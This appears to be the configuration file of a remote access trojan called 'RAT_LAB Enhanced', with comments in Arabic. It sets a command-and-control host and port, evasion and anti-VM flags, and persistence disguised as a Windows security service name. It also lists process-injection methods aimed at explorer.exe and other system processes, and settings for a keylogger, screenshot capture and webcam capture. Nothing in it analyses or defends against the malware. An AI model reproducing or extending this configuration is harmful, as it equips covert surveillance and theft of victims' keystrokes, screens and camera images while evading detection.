# RAT_LAB Enhanced Configuration

C2_HOST = "192.168.1.100"
C2_PORT = 4444
ENABLE_EVASION = True
ANTI_VM = True
OBfuscate = True

# إعدادات التشفير
ENCRYPTION_KEY="RAT_LAB_ENHANCED"

# إعدادات الاستمرارية
PERSISTENCE_NAME = "WindowsSecurityHealthService"

# إعدادات الشبكة
CONNECTION_TIMEOUT = 30
HEARTBEAT_INTERVAL = 30
MAX_RETRIES = 3

# إعدادات الحقن
INJECTION_METHODS = ["CreateRemoteThread", "DLL", "APC"]
TARGET_PROCESSES = ["explorer.exe", "RuntimeBroker.exe", "sihost.exe"]

# إعدادات Keylogger
KEYLOG_FILE = "keylog.txt"
KEYLOG_INTERVAL = 100  # milliseconds

# إعدادات Screenshot
SCREENSHOT_QUALITY = 90
SCREENSHOT_FORMAT = "PNG"

# إعدادات Webcam
WEBCAM_RESOLUTION = (640, 480)
WEBCAM_FORMAT = "JPEG"